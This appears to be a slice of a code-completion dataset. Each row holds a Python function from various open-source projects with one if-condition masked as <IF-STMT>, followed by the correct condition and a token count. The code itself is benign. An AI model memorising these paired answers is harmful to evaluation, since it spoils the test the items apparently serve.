2871,"def autoname(self):<tab>naming_method = frappe.db.get_value(""HR Settings"", None, ""emp_created_by"")<tab>if not naming_method:<tab><tab>throw(_(""Please setup Employee Naming System in Human Resource > HR Settings""))<tab>else:<tab><tab>if naming_method == ""Naming Series"":<tab><tab><tab>set_name_by_naming_series(self)<tab><tab>elif naming_method == ""Employee Number"":<tab><tab><tab>self.name = self.employee_number<tab><tab><IF-STMT><tab><tab><tab>self.set_employee_name()<tab><tab><tab>self.name = self.employee_name<tab>self.employee = self.name","elif naming_method == ""Full Name"" :",169
2872,"def readHexStringFromStream(stream):<tab>stream.read(1)<tab>txt = """"<tab>x = b_("""")<tab>while True:<tab><tab>tok = readNonWhitespace(stream)<tab><tab>if not tok:<tab><tab><tab># stream has truncated prematurely<tab><tab><tab>raise PdfStreamError(""Stream has ended unexpectedly"")<tab><tab>if tok == b_("">""):<tab><tab><tab>break<tab><tab>x += tok<tab><tab><IF-STMT><tab><tab><tab>txt += chr(int(x, base=16))<tab><tab><tab>x = b_("""")<tab>if len(x) == 1:<tab><tab>x += b_(""0"")<tab>if len(x) == 2:<tab><tab>txt += chr(int(x, base=16))<tab>return createStringObject(b_(txt))",if len ( x ) == 2 :,190
2873,"def test_technical_on(self):<tab># Turn everything on<tab>data = {<tab><tab>""developer_comments"": ""Test comment!"",<tab><tab>""whiteboard-public"": ""Whiteboard info."",<tab>}<tab>response = self.client.post(self.technical_edit_url, data)<tab>assert response.context[""form""].errors == {}<tab>addon = self.get_addon()<tab>for k in data:<tab><tab>if k == ""developer_comments"":<tab><tab><tab>assert str(getattr(addon, k)) == str(data[k])<tab><tab><IF-STMT><tab><tab><tab>assert str(addon.whiteboard.public) == str(data[k])<tab><tab>else:<tab><tab><tab>assert getattr(addon, k) == (data[k] == ""on"")","elif k == ""whiteboard-public"" :",193
2874,"def create_season_posters(self, show_obj, force=False):<tab>if self.season_posters and show_obj:<tab><tab>result = []<tab><tab>for ep_obj in show_obj.episodes:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>sickrage.app.log.debug(<tab><tab><tab><tab><tab>""Metadata provider ""<tab><tab><tab><tab><tab>+ self.name<tab><tab><tab><tab><tab>+ "" creating season posters for ""<tab><tab><tab><tab><tab>+ show_obj.name<tab><tab><tab><tab>)<tab><tab><tab><tab>result = result + [self.save_season_poster(show_obj, ep_obj.season)]<tab><tab>return all(result)<tab>return False","if not self . _has_season_poster ( show_obj , ep_obj . season ) or force :",196
2875,"def get_prefixes(self, guild: Optional[discord.Guild] = None) -> List[str]:<tab>ret: List[str]<tab>gid: Optional[int] = guild.id if guild else None<tab>if gid in self._cached:<tab><tab>ret = self._cached[gid].copy()<tab>else:<tab><tab>if gid is not None:<tab><tab><tab>ret = await self._config.guild_from_id(gid).prefix()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ret = await self.get_prefixes(None)<tab><tab>else:<tab><tab><tab>ret = self._global_prefix_overide or (await self._config.prefix())<tab><tab>self._cached[gid] = ret.copy()<tab>return ret",if not ret :,180
2876,"def checkUnchangedIvars(obj, d, exceptions=None):<tab>if not exceptions:<tab><tab>exceptions = []<tab>ok = True<tab>for key in d:<tab><tab>if key not in exceptions:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>g.trace(<tab><tab><tab><tab><tab>""changed ivar: %s old: %s new: %s""<tab><tab><tab><tab><tab>% (key, repr(d.get(key)), repr(getattr(obj, key)))<tab><tab><tab><tab>)<tab><tab><tab><tab>ok = False<tab>return ok","if getattr ( obj , key ) != d . get ( key ) :",142
2877,"def validate_ip(address):<tab>try:<tab><tab>if socket.inet_aton(address):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>debug_msg(""setcore"", ""this is a valid IP address"", 5)<tab><tab><tab><tab>return True<tab><tab><tab>else:<tab><tab><tab><tab>print_error(""This is not a valid IP address..."")<tab><tab><tab><tab>raise socket.error<tab><tab>else:<tab><tab><tab>raise socket_error<tab>except socket.error:<tab><tab>return False","if len ( address . split ( ""."" ) ) == 4 :",125
2878,"def kernel(x, y):<tab>diff = safe_norm(x - y, ord=2) if self._normed() and x.ndim >= 1 else x - y<tab>kernel_res = jnp.exp(-(diff ** 2) / bandwidth)<tab>if self._mode == ""matrix"":<tab><tab><IF-STMT><tab><tab><tab>return kernel_res * jnp.identity(x.shape[0])<tab><tab>else:<tab><tab><tab>return jnp.diag(kernel_res)<tab>else:<tab><tab>return kernel_res","if self . matrix_mode == ""norm_diag"" :",133
2879,"def __init__(self, transforms):<tab>assert isinstance(transforms, collections.abc.Sequence)<tab>self.transforms = []<tab>for transform in transforms:<tab><tab>if isinstance(transform, dict):<tab><tab><tab>transform = build_from_cfg(transform, PIPELINES)<tab><tab><tab>self.transforms.append(transform)<tab><tab><IF-STMT><tab><tab><tab>self.transforms.append(transform)<tab><tab>else:<tab><tab><tab>raise TypeError(""transform must be callable or a dict"")",elif callable ( transform ) :,115
2880,"def translate(<tab>self,<tab>message: str,<tab>plural_message: Optional[str] = None,<tab>count: Optional[int] = None,) -> str:<tab>if plural_message is not None:<tab><tab>assert count is not None<tab><tab><IF-STMT><tab><tab><tab>message = plural_message<tab><tab><tab>message_dict = self.translations.get(""plural"", {})<tab><tab>else:<tab><tab><tab>message_dict = self.translations.get(""singular"", {})<tab>else:<tab><tab>message_dict = self.translations.get(""unknown"", {})<tab>return message_dict.get(message, message)",if count != 1 :,149
2881,"def install_requires(cls, reduced_dependencies):<tab>install_requires = OrderedSet()<tab>for dep in reduced_dependencies:<tab><tab><IF-STMT><tab><tab><tab>for req in dep.payload.requirements:<tab><tab><tab><tab>install_requires.add(str(req.requirement))<tab><tab>elif cls.has_provides(dep):<tab><tab><tab>install_requires.add(dep.provides.key)<tab>return install_requires",if cls . is_requirements ( dep ) :,110
2882,"def doit():<tab>recipes_path = expanduser(""recipes.pprint"")<tab>recipe_dicts = eval(open(recipes_path).read())<tab>for r in recipe_dicts:<tab><tab>for key in r.keys():<tab><tab><tab>if key not in (""desc"", ""comments""):<tab><tab><tab><tab>del r[key]<tab><tab>for c in r[""comments""]:<tab><tab><tab>for key in c.keys():<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>del c[key]<tab>f = open(""stripped.pprint"", ""w"")<tab>f.write(pformat(recipe_dicts))<tab>f.close()","if key not in ( ""comment"" , ""title"" ) :",163
2883,"def setup(self, name):<tab>value = self.default<tab>if self.environ:<tab><tab>full_environ_name = self.full_environ_name(name)<tab><tab><IF-STMT><tab><tab><tab>value = self.to_python(os.environ[full_environ_name])<tab><tab>elif self.environ_required:<tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""Value {0!r} is required to be set as the ""<tab><tab><tab><tab>""environment variable {1!r}"".format(name, full_environ_name)<tab><tab><tab>)<tab>self.value = value<tab>return value",if full_environ_name in os . environ :,153
2884,"def get_art_abs(story_file):<tab>lines = read_text_file(story_file)<tab>lines = [line.lower() for line in lines]<tab>lines = [fix_missing_period(line) for line in lines]<tab>article_lines = []<tab>highlights = []<tab>next_is_highlight = False<tab>for idx, line in enumerate(lines):<tab><tab>if line == """":<tab><tab><tab>continue  # empty line<tab><tab><IF-STMT><tab><tab><tab>next_is_highlight = True<tab><tab>elif next_is_highlight:<tab><tab><tab>highlights.append(line)<tab><tab>else:<tab><tab><tab>article_lines.append(line)<tab>article = "" "".join(article_lines)<tab>abstract = "" "".join(highlights)<tab>return article, abstract","elif line . startswith ( ""@highlight"" ) :",194
2885,"def _ordered_tag_specs(<tab>entity_tag_specs: Optional[List[EntityTagSpec]],) -> List[EntityTagSpec]:<tab>""""""Ensure that order of entity tag specs matches CRF layer order.""""""<tab>if entity_tag_specs is None:<tab><tab>return []<tab>crf_order = [<tab><tab>ENTITY_ATTRIBUTE_TYPE,<tab><tab>ENTITY_ATTRIBUTE_ROLE,<tab><tab>ENTITY_ATTRIBUTE_GROUP,<tab>]<tab>ordered_tag_spec = []<tab>for tag_name in crf_order:<tab><tab>for tag_spec in entity_tag_specs:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ordered_tag_spec.append(tag_spec)<tab>return ordered_tag_spec",if tag_name == tag_spec . tag_name :,177
2886,"def checkDrag(self, root, target):<tab>""""""Return False if target is any descendant of root.""""""<tab>c = self<tab>message = ""Can not drag a node into its descendant tree.""<tab>for z in root.subtree():<tab><tab><IF-STMT><tab><tab><tab>if g.app.unitTesting:<tab><tab><tab><tab>g.app.unitTestDict[""checkMoveWithParentWithWarning""] = True<tab><tab><tab>else:<tab><tab><tab><tab>c.alert(message)<tab><tab><tab>return False<tab>return True",if z == target :,122
2887,"def get_adapter(self, pattern=None):<tab>adapters = self.get_adapters()<tab>if pattern is None:<tab><tab><IF-STMT><tab><tab><tab>return adapters[0]<tab><tab>else:<tab><tab><tab>raise DBusNoSuchAdapterError(""No adapter(s) found"")<tab>else:<tab><tab>for adapter in adapters:<tab><tab><tab>path = adapter.get_object_path()<tab><tab><tab>if path.endswith(pattern) or adapter[""Address""] == pattern:<tab><tab><tab><tab>return adapter<tab><tab>raise DBusNoSuchAdapterError(""No adapters found with pattern: %s"" % pattern)",if len ( adapters ) :,144
2888,"def __init__(self, children, quiet_exceptions=()):<tab>self.keys = None<tab>if isinstance(children, dict):<tab><tab>self.keys = list(children.keys())<tab><tab>children = children.values()<tab>self.children = []<tab>for i in children:<tab><tab>if not isinstance(i, YieldPoint):<tab><tab><tab>i = convert_yielded(i)<tab><tab><IF-STMT><tab><tab><tab>i = YieldFuture(i)<tab><tab>self.children.append(i)<tab>assert all(isinstance(i, YieldPoint) for i in self.children)<tab>self.unfinished_children = set(self.children)<tab>self.quiet_exceptions = quiet_exceptions",if is_future ( i ) :,166
2889,"def _make_callback(self):<tab>callback = self.callback<tab>for plugin in self.all_plugins():<tab><tab>try:<tab><tab><tab>if hasattr(plugin, ""apply""):<tab><tab><tab><tab>callback = plugin.apply(callback, self)<tab><tab><tab>else:<tab><tab><tab><tab>callback = plugin(callback)<tab><tab>except RouteReset:  # Try again with changed configuration.<tab><tab><tab>return self._make_callback()<tab><tab><IF-STMT><tab><tab><tab>update_wrapper(callback, self.callback)<tab>return callback",if not callback is self . callback :,131
2890,"def _check_conflict(func, other_funcs):<tab>if steps[func]:<tab><tab>for other_func in other_funcs:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError(""Can't specify both %s and %s"" % (func, other_func))",if steps [ other_func ] and other_func != func :,76
2891,"def shutdown(self, cleanup=True):<tab>super(LocalDistributedRunner, self).shutdown()<tab>global _dummy_cpu_actor<tab>global _dummy_cuda_actor<tab>if cleanup:<tab><tab>if _dummy_cpu_actor or _dummy_cuda_actor:<tab><tab><tab>assert not self.is_actor(), ""Actor shouldn't have a "" ""dummy actor.""<tab><tab><IF-STMT><tab><tab><tab>ray.kill(_dummy_cpu_actor)<tab><tab>if _dummy_cuda_actor:<tab><tab><tab>ray.kill(_dummy_cuda_actor)<tab><tab>_dummy_cpu_actor = None<tab><tab>_dummy_cuda_actor = None",if _dummy_cpu_actor :,158
2892,"def _publish(self, data):<tab>retry = True<tab>while True:<tab><tab>try:<tab><tab><tab>if not retry:<tab><tab><tab><tab>self._redis_connect()<tab><tab><tab>return self.redis.publish(self.channel, pickle.dumps(data))<tab><tab>except redis.exceptions.ConnectionError:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>logger.error(""Cannot publish to redis... retrying"")<tab><tab><tab><tab>retry = False<tab><tab><tab>else:<tab><tab><tab><tab>logger.error(""Cannot publish to redis... giving up"")<tab><tab><tab><tab>break",if retry :,134
2893,"def simulate_policy(args):<tab>data = torch.load(args.file)<tab>policy = data[""evaluation/policy""]<tab>env = data[""evaluation/env""]<tab>print(""Policy loaded"")<tab>if args.gpu:<tab><tab>set_gpu_mode(True)<tab><tab>policy.cuda()<tab>while True:<tab><tab>path = rollout(<tab><tab><tab>env,<tab><tab><tab>policy,<tab><tab><tab>max_path_length=args.H,<tab><tab><tab>render=True,<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>env.log_diagnostics([path])<tab><tab>logger.dump_tabular()","if hasattr ( env , ""log_diagnostics"" ) :",160
2894,"def get_bucket_latest_versions(self, bucket_name):<tab>versions = self.get_bucket_versions(bucket_name)<tab>latest_modified_per_key = {}<tab>latest_versions = {}<tab>for version in versions:<tab><tab>name = version.name<tab><tab>last_modified = version.last_modified<tab><tab>version_id = version.version_id<tab><tab>latest_modified_per_key[name] = max(<tab><tab><tab>last_modified, latest_modified_per_key.get(name, datetime.datetime.min)<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>latest_versions[name] = version_id<tab>return latest_versions",if last_modified == latest_modified_per_key [ name ] :,173
2895,"def _get_ntp_entity(self, peer_type):<tab>ntp_entities = {}<tab>command = ""show ntp peers""<tab>ntp_peers_table = self._get_command_table(command, ""TABLE_peers"", ""ROW_peers"")<tab>for ntp_peer in ntp_peers_table:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>peer_addr = napalm.base.helpers.ip(ntp_peer.get(""PeerIPAddress"").strip())<tab><tab>ntp_entities[peer_addr] = {}<tab>return ntp_entities","if ntp_peer . get ( ""serv_peer"" , """" ) . strip ( ) != peer_type :",164
2896,"def kaiming_init(<tab>module, a=0, mode=""fan_out"", nonlinearity=""relu"", bias=0, distribution=""normal""):<tab>assert distribution in [""uniform"", ""normal""]<tab>if hasattr(module, ""weight"") and module.weight is not None:<tab><tab><IF-STMT><tab><tab><tab>nn.init.kaiming_uniform_(<tab><tab><tab><tab>module.weight, a=a, mode=mode, nonlinearity=nonlinearity<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>nn.init.kaiming_normal_(<tab><tab><tab><tab>module.weight, a=a, mode=mode, nonlinearity=nonlinearity<tab><tab><tab>)<tab>if hasattr(module, ""bias"") and module.bias is not None:<tab><tab>nn.init.constant_(module.bias, bias)","if distribution == ""uniform"" :",192
2897,"def _get_arguments(<tab>self, name: str, source: Dict[str, List[bytes]], strip: bool = True) -> List[str]:<tab>values = []<tab>for v in source.get(name, []):<tab><tab>s = self.decode_argument(v, name=name)<tab><tab><IF-STMT><tab><tab><tab># Get rid of any weird control chars (unless decoding gave<tab><tab><tab># us bytes, in which case leave it alone)<tab><tab><tab>s = RequestHandler._remove_control_chars_regex.sub("" "", s)<tab><tab>if strip:<tab><tab><tab>s = s.strip()<tab><tab>values.append(s)<tab>return values","if isinstance ( s , unicode_type ) :",164
2898,"def __str__(self):<tab>s = ""{""<tab>sep = """"<tab>for k, v in self.iteritems():<tab><tab>s += sep<tab><tab>if type(k) == str:<tab><tab><tab>s += ""'%s'"" % k<tab><tab>else:<tab><tab><tab>s += str(k)<tab><tab>s += "": ""<tab><tab><IF-STMT><tab><tab><tab>s += ""'%s'"" % v<tab><tab>else:<tab><tab><tab>s += str(v)<tab><tab>sep = "", ""<tab>s += ""}""<tab>return s",if type ( v ) == str :,131
2899,"def contains(self, other_route):<tab>if isinstance(other_route, list):<tab><tab>return self.to_list()[0 : len(other_route)] == other_route<tab># This only works before merging<tab>assert len(other_route.outgoing) <= 1, ""contains(..) cannot be called after a merge""<tab>assert len(self.outgoing) <= 1, ""contains(..) cannot be called after a merge""<tab>if other_route.task_spec == self.task_spec:<tab><tab>if other_route.outgoing and self.outgoing:<tab><tab><tab>return self.outgoing[0].contains(other_route.outgoing[0])<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>elif not other_route.outgoing:<tab><tab><tab>return True<tab>return False",elif self . outgoing :,184
2900,"def iter_help(cls):<tab>for variable_name, value in sorted(cls.__dict__.items()):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>variable_type, variable_text = cls.process_pydoc(getattr(value, ""__doc__""))<tab><tab>yield variable_name, variable_type, variable_text","if not variable_name . startswith ( ""PEX_"" ) :",83
2901,"def _clean_dict(json_dict):<tab>for key, value in json_dict.items():<tab><tab>if isinstance(value, list):<tab><tab><tab>json_dict[key] = list(OrderedSet(map(_clean_string, value)))<tab><tab><IF-STMT><tab><tab><tab>json_dict[key] = _clean_dict(value)<tab>return OrderedDict(filter(lambda x: x[1], json_dict.items()))","elif isinstance ( value , dict ) :",105
2902,"def _createdir(self):<tab>if not os.path.exists(self._dir):<tab><tab>try:<tab><tab><tab>os.makedirs(self._dir, 0o700)<tab><tab>except OSError as e:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise EnvironmentError(<tab><tab><tab><tab><tab>""Cache directory '%s' does not exist ""<tab><tab><tab><tab><tab>""and could not be created'"" % self._dir<tab><tab><tab><tab>)",if e . errno != errno . EEXIST :,111
2903,"def JobWait(self, waiter):<tab># type: (Waiter) -> wait_status_t<tab># wait builtin can be interrupted<tab>while True:<tab><tab># Don't retry<tab><tab>result = waiter.WaitForOne(False)<tab><tab><IF-STMT>  # signal<tab><tab><tab>return wait_status.Cancelled(result)<tab><tab>if result == -1:  # nothing to wait for<tab><tab><tab>break<tab><tab>if self.state != job_state_e.Running:<tab><tab><tab>break<tab>return wait_status.Proc(self.status)",if result > 0 :,135
2904,"def _deserialize_pickle5_data(self, data):<tab>try:<tab><tab>in_band, buffers = unpack_pickle5_buffers(data)<tab><tab><IF-STMT><tab><tab><tab>obj = pickle.loads(in_band, buffers=buffers)<tab><tab>else:<tab><tab><tab>obj = pickle.loads(in_band)<tab># cloudpickle does not provide error types<tab>except pickle.pickle.PicklingError:<tab><tab>raise DeserializationError()<tab>return obj",if len ( buffers ) > 0 :,115
2905,"def svgGetPaths(svgCode):<tab>doc = xmlparseString(svgCode)<tab>svg = doc.documentElement<tab>paths = findPathNodes(svg)<tab>isFigmaSVG = svgCode.find(""Figma</desc>"") != -1<tab>if len(paths) == 0:<tab><tab>return paths, (0, 0)<tab>paths2 = []<tab>for path in paths:<tab><tab>id = path.getAttribute(""id"")<tab><tab><IF-STMT><tab><tab><tab>tr = nodeTranslation(path)<tab><tab><tab>d = path.getAttribute(""d"")<tab><tab><tab>paths2.append((d, tr))<tab>return paths2, isFigmaSVG","if not isFigmaSVG or ( id is None or id . find ( ""stroke"" ) == - 1 ) :",179
2906,"def get_track_id_from_json(item):<tab>""""""Try to extract video Id from various response types""""""<tab>fields = [<tab><tab>""contentDetails/videoId"",<tab><tab>""snippet/resourceId/videoId"",<tab><tab>""id/videoId"",<tab><tab>""id"",<tab>]<tab>for field in fields:<tab><tab>node = item<tab><tab>for p in field.split(""/""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>node = node.get(p)<tab><tab>if node:<tab><tab><tab>return node<tab>return """"","if node and isinstance ( node , dict ) :",137
2907,"def save(self):<tab>self._idx_lock.acquire()<tab>try:<tab><tab>if self._is_idx_dirty:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._mk_dbdir()<tab><tab><tab>self.db.save_pickle(<tab><tab><tab><tab>join(self.base_dir, ""dirs_from_basename""), self._dirs_from_basename<tab><tab><tab>)<tab><tab><tab>self._is_idx_dirty = False<tab>finally:<tab><tab>self._idx_lock.release()",if not exists ( self . base_dir ) :,130
2908,"def _init_from_response(self, response):<tab>self.id = response[""id""]<tab>self.uri = response.get(""mongodb_auth_uri"", response[""mongodb_uri""])<tab>for member in response[""members""]:<tab><tab>if member[""state""] == 1:<tab><tab><tab>self.primary = Server(member[""server_id""], member[""host""])<tab><tab><IF-STMT><tab><tab><tab>self.secondary = Server(member[""server_id""], member[""host""])<tab>return self","elif member [ ""state"" ] == 2 :",120
2909,"def verify_secret_key(request):<tab>""Verifies secret key for a request""<tab>if request.user.username:<tab><tab># always allow authenticated users<tab><tab>return True<tab>else:<tab><tab>key = request.GET[""secret""]<tab><tab>user_id, secret = key.split(""."", 1)<tab><tab>try:<tab><tab><tab>profile = User.objects.get(pk=user_id)<tab><tab>except:<tab><tab><tab>return False<tab><tab><IF-STMT><tab><tab><tab>request.user = profile.user<tab><tab><tab>return True<tab>return False","if key == get_secret_key ( request , profile ) :",144
2910,"def compute(self, split):<tab>rd = random.Random(self.seed + split.index)<tab>if self.withReplacement:<tab><tab>olddata = list(self.prev.iterator(split))<tab><tab>sampleSize = int(math.ceil(len(olddata) * self.frac))<tab><tab>for i in range(sampleSize):<tab><tab><tab>yield rd.choice(olddata)<tab>else:<tab><tab>for i in self.prev.iterator(split):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield i",if rd . random ( ) <= self . frac :,133
2911,"def splitIntoWords(name):<tab>wordlist = []<tab>wordstart = 0<tab>l = len(name)<tab>for i in range(l):<tab><tab>c = name[i]<tab><tab>n = None<tab><tab>if c == "" "" or c == ""-"":<tab><tab><tab>n = name[wordstart:i]<tab><tab><IF-STMT><tab><tab><tab>n = name[wordstart : i + 1]<tab><tab>if n:<tab><tab><tab>wordstart = i<tab><tab><tab>if c == ""-"" and n != """":<tab><tab><tab><tab>n += ""-""<tab><tab><tab>if c == "" "" or c == ""-"":<tab><tab><tab><tab>wordstart = i + 1<tab><tab><tab>wordlist.append(n)<tab>return wordlist",elif i == l - 1 :,174
2912,"def check_file(f, path):<tab>if not (ignore_substring and ignore_substring in f):<tab><tab><IF-STMT><tab><tab><tab>compl_path = os.path.join(path, f)<tab><tab><tab>if os.path.isfile(compl_path):<tab><tab><tab><tab>return compl_path<tab>return False",if substring in f :,83
2913,"def keyPressEvent(self, event):<tab>""""""Add up and down arrow key events to built in functionality.""""""<tab>keyPressed = event.key()<tab>if keyPressed in [Constants.UP_KEY, Constants.DOWN_KEY, Constants.TAB_KEY]:<tab><tab>if keyPressed == Constants.UP_KEY:<tab><tab><tab>self.index = max(0, self.index - 1)<tab><tab><IF-STMT><tab><tab><tab>self.index = min(len(self.completerStrings) - 1, self.index + 1)<tab><tab>elif keyPressed == Constants.TAB_KEY and self.completerStrings:<tab><tab><tab>self.tabPressed()<tab><tab>if self.completerStrings:<tab><tab><tab>self.setTextToCompleterIndex()<tab>super(CueLineEdit, self).keyPressEvent(event)",elif keyPressed == Constants . DOWN_KEY :,192
2914,"def _get_disk_size(cls, path, ignored=None):<tab>if ignored is None:<tab><tab>ignored = []<tab>if path in ignored:<tab><tab>return 0<tab>total = 0<tab>for entry in scandir(path):<tab><tab><IF-STMT><tab><tab><tab>total += cls._get_disk_size(entry.path, ignored=ignored)<tab><tab>elif entry.is_file():<tab><tab><tab>total += entry.stat().st_size<tab>return total",if entry . is_dir ( ) :,117
2915,"def _handle_rate_limit(<tab>self, exception: RedditAPIException) -> Optional[Union[int, float]]:<tab>for item in exception.items:<tab><tab>if item.error_type == ""RATELIMIT"":<tab><tab><tab>amount_search = self._ratelimit_regex.search(item.message)<tab><tab><tab>if not amount_search:<tab><tab><tab><tab>break<tab><tab><tab>seconds = int(amount_search.group(1))<tab><tab><tab>if ""minute"" in amount_search.group(2):<tab><tab><tab><tab>seconds *= 60<tab><tab><tab><IF-STMT><tab><tab><tab><tab>sleep_seconds = seconds + min(seconds / 10, 1)<tab><tab><tab><tab>return sleep_seconds<tab>return None",if seconds <= int ( self . config . ratelimit_seconds ) :,181
2916,"def validate(self):<tab>try:<tab><tab>f = int(eval(self.setting.getValue(), {}, {}))<tab><tab><IF-STMT><tab><tab><tab>return ERROR, ""This setting should not be below "" + str(self.minValue)<tab><tab>if self.maxValue is not None and f > self.maxValue:<tab><tab><tab>return ERROR, ""This setting should not be above "" + str(self.maxValue)<tab><tab>return SUCCESS, """"<tab>except (ValueError, SyntaxError, TypeError, NameError):<tab><tab>return (<tab><tab><tab>ERROR,<tab><tab><tab>'""'<tab><tab><tab>+ str(self.setting.getValue())<tab><tab><tab>+ '"" is not a valid whole number or expression',<tab><tab>)",if self . minValue is not None and f < self . minValue :,180
2917,"def rename(self, remote_name, new_remote_name):<tab>remotes = self.load_remotes()<tab>remotes.rename(remote_name, new_remote_name)<tab>with self._cache.editable_packages.disable_editables():<tab><tab>for ref in self._cache.all_refs():<tab><tab><tab>with self._cache.package_layout(ref).update_metadata() as metadata:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>metadata.recipe.remote = new_remote_name<tab><tab><tab><tab>for pkg_metadata in metadata.packages.values():<tab><tab><tab><tab><tab>if pkg_metadata.remote == remote_name:<tab><tab><tab><tab><tab><tab>pkg_metadata.remote = new_remote_name<tab><tab>remotes.save(self._filename)",if metadata . recipe . remote == remote_name :,195
2918,"def _convert_idx(self, idx):<tab>graph_idx = 0<tab>node_idx = idx<tab>for i in range(len(self.graphs)):<tab><tab><IF-STMT><tab><tab><tab>graph_idx = i<tab><tab><tab>break<tab><tab>else:<tab><tab><tab>node_idx -= self.graphs[i].number_of_nodes()<tab>return graph_idx, node_idx",if node_idx < self . graphs [ i ] . number_of_nodes ( ) :,107
2919,"def emit_pre_migrate_signal(verbosity, interactive, db, **kwargs):<tab># Emit the pre_migrate signal for every application.<tab>for app_config in apps.get_app_configs():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if verbosity >= 2:<tab><tab><tab>print(""Running pre-migrate handlers for application %s"" % app_config.label)<tab><tab>models.signals.pre_migrate.send(<tab><tab><tab>sender=app_config,<tab><tab><tab>app_config=app_config,<tab><tab><tab>verbosity=verbosity,<tab><tab><tab>interactive=interactive,<tab><tab><tab>using=db,<tab><tab><tab>**kwargs<tab><tab>)",if app_config . models_module is None :,166
2920,"def slice(self, slice):<tab>gridscope = GridScope(globals=self.globals)<tab>for key in self.user_added:<tab><tab>value = self[key]<tab><tab><IF-STMT><tab><tab><tab>grid = value<tab><tab><tab>sliced = np.sum(grid[slice, ...], axis=0)<tab><tab><tab>logger.debug(""sliced %s from %r to %r"", key, grid.shape, sliced.shape)<tab><tab><tab>gridscope[key] = sliced<tab><tab>else:<tab><tab><tab>gridscope[key] = value<tab>return gridscope","if isinstance ( value , np . ndarray ) :",140
2921,"def get_last_tagged(self):<tab>if not self.last_tagged:<tab><tab>last = datetime(1970, 1, 1)<tab><tab>for tag in self.tags:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>last = tag.last_seen<tab><tab>self.update(set__last_tagged=last)<tab><tab>return last<tab>else:<tab><tab>return self.last_tagged",if tag . last_seen > last :,101
2922,"def recalculate_user_disk_usage(app, **kwargs):<tab>user_id = kwargs.get(""user_id"", None)<tab>sa_session = app.model.context<tab>if user_id:<tab><tab>user = sa_session.query(app.model.User).get(app.security.decode_id(user_id))<tab><tab><IF-STMT><tab><tab><tab>user.calculate_and_set_disk_usage()<tab><tab>else:<tab><tab><tab>log.error(<tab><tab><tab><tab>""Recalculate user disk usage task failed, user %s not found"" % user_id<tab><tab><tab>)<tab>else:<tab><tab>log.error(""Recalculate user disk usage task received without user_id."")",if user :,165
2923,"def log_items(self, interface, action, media, items):<tab>if not items:<tab><tab>return<tab><tab># Log each item<tab>for item in items:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>log.info(<tab><tab><tab>""[%s:%s](%s) %r (%r)"",<tab><tab><tab>interface,<tab><tab><tab>action,<tab><tab><tab>media,<tab><tab><tab>item.get(""title""),<tab><tab><tab>item.get(""year""),<tab><tab>)<tab><tab>if media == ""shows"":<tab><tab><tab># Log each episode<tab><tab><tab>self.log_episodes(item)",if not item :,150
2924,"def test_unbiased_coin_has_no_second_order():<tab>counts = Counter()<tab>for i in range(256):<tab><tab>buf = bytes([i])<tab><tab>data = ConjectureData.for_buffer(buf)<tab><tab>result = cu.biased_coin(data, 0.5)<tab><tab><IF-STMT><tab><tab><tab>counts[result] += 1<tab>assert counts[False] == counts[True] > 0",if data . buffer == buf :,111
2925,"def gettempfilename(suffix):<tab>""""""Returns a temporary filename""""""<tab>if ""_"" in os.environ:<tab><tab># tempfile.mktemp() crashes on some Wine versions (the one of Ubuntu 12.04 particularly)<tab><tab><IF-STMT><tab><tab><tab>tmpdir = "".""<tab><tab><tab>if ""TMP"" in os.environ:<tab><tab><tab><tab>tmpdir = os.environ[""TMP""]<tab><tab><tab>import time<tab><tab><tab>import random<tab><tab><tab>random.seed(time.time())<tab><tab><tab>random_part = ""file%d"" % random.randint(0, 1000000000)<tab><tab><tab>return os.path.join(tmpdir, random_part + suffix)<tab>return tempfile.mktemp(suffix)","if os . environ [ ""_"" ] . find ( ""wine"" ) >= 0 :",172
2926,"def _get_functionapp_runtime_language(<tab>self, app_settings):  # pylint: disable=no-self-use<tab>functions_worker_runtime = [<tab><tab>setting[""value""]<tab><tab>for setting in app_settings<tab><tab>if setting[""name""] == ""FUNCTIONS_WORKER_RUNTIME""<tab>]<tab>if functions_worker_runtime:<tab><tab>functionapp_language = functions_worker_runtime[0]<tab><tab><IF-STMT><tab><tab><tab>return SUPPORTED_LANGUAGES[functionapp_language]<tab><tab>raise LanguageNotSupportException(functionapp_language)<tab>return None",if SUPPORTED_LANGUAGES . get ( functionapp_language ) is not None :,151
2927,"def seek(self, offset, whence=io.SEEK_SET):<tab>if self.mode == WRITE:<tab><tab>if whence != io.SEEK_SET:<tab><tab><tab>if whence == io.SEEK_CUR:<tab><tab><tab><tab>offset = self.offset + offset<tab><tab><tab>else:<tab><tab><tab><tab>raise ValueError(""Seek from end not supported"")<tab><tab><IF-STMT><tab><tab><tab>raise OSError(""Negative seek in write mode"")<tab><tab>count = offset - self.offset<tab><tab>chunk = bytes(1024)<tab><tab>for i in range(count // 1024):<tab><tab><tab>self.write(chunk)<tab><tab>self.write(bytes(count % 1024))<tab>elif self.mode == READ:<tab><tab>self._check_not_closed()<tab><tab>return self._buffer.seek(offset, whence)<tab>return self.offset",if offset < self . offset :,199
